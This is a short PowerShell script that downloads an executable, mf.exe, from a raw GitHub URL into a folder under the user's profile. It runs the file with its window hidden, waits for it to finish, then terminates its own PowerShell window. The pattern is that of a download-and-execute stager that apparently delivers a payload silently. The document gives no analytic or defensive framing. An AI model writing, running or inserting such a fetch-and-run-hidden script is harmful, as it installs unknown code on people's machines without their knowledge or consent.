$url = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/mf.exe"
$outputFolder = "$($env:USERPROFILE)\Library"
$outputFile = "$outputFolder\mf.exe"

# Create the folder if it doesn't exist
if (-not (Test-Path $outputFolder)) {
    New-Item -ItemType Directory -Path $outputFolder
}

# Download the file
Invoke-WebRequest -Uri $url -OutFile $outputFile

# Start the executable without a window
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = $outputFile
$psi.UseShellExecute = $false
$psi.CreateNoWindow = $true
$process = [System.Diagnostics.Process]::Start($psi)
$process.WaitForExit()

# Close the PowerShell window
Stop-Process -Id $PID
